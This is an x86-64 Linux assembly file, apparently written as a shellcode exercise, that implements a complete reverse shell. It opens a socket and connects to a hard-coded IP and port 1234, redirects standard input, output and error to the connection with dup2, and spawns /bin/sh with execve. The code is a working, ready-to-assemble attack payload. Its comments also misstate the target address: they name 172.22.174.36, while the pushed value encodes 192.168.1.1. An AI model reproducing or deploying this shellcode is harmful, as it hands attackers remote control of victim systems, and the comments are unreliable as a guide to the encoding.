global _start

section .text

_start:


;Reference : rdi,rsi,rdx,r10,r8,r9

;Deal with socketfd first
;syscall for socket is 41
;int socket(int domain, int type, int protocol);
;AF_INET has value of 2
;SOCK_STREAM has value 1

xor rdi, rdi ; rdi=0
xor rsi, rsi
xor rdx, rdx
add rdi, 0x2
inc rsi
xor rax, rax ; rax = 0
mov al, 0x29 ; initialize to 41
syscall	; execute socket and value of sockfd is stored in rax
mov rdi, rax

;mysockaddr.sin_family = AF_INET;
;mysockaddr.sin_port = htons(port);
;mysockaddr.sin_addr.s_addr = inet_addr("172.22.174.36"); //Random fake address

;AF_INET is stored in rdi
; 172.22.174.36 is \x24\xae\x16\xac which is doubleword
; Push from bottom up since it is in a stack and a pointer reference
; htons of port 1234 is python -c "hex(socket.htons(1234))" which is 0xd204
; htons effective changes value of the argument into  hex form and returning in little endian format.
; In this case,port 1234 is changed to 0x4d2 and little endian format is 0xd204

push dword 0x0101a8c0  
push word 0xd204 
push word  0x2 ; since rdi already stores the value of IF_INET which is 2

;connect syscall is 42

xor rdx, rdx
mov dl, 0x10; sizeof sockaddr is 16
mov rsi, rsp ; Put the structure pointer into second argument
xor rax, rax
add rax, 42
syscall ;	 Call connect function syscallconnect(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));

;syscall number for dup2 -- duplicate file descriptor
; is 33
; dup2(sockfd, 0)

;sockfd is still stored in rdi so there is no neeed to change rdi
xor rsi, rsi
xor rax, rax
add rax, 0x21
syscall ; dup2(sockfd,0)

xor rax, rax
add rax, 0x21
inc rsi
syscall ; dup2(sockfd,1)

xor rax, rax
add rax, 0x21
inc rsi
syscall ; dup2(sockfd,2)


;Now is on to execve syscall - value 59

;stringg="//bin/sh"
;stringg[::-1].encode("hex")
;which gives '68732f6e69622f2f'

xor rax, rax
xor rdi, rdi ; third argument
xor rsi, rsi
xor rdx, rdx

push rax ; push 0 on stack
mov rdx, rsp
;0x68732f6e69622f2f
mov rbx, 0x68732f6e69622f2f
push rbx
mov rdi, rsp
push rax
push rdi
mov rsi, rsp
add rax, 59
syscall


xor rax,rax
mov al, 0x3c
xor rdi, rdi
syscall ; EXIT FROM PROGRAM



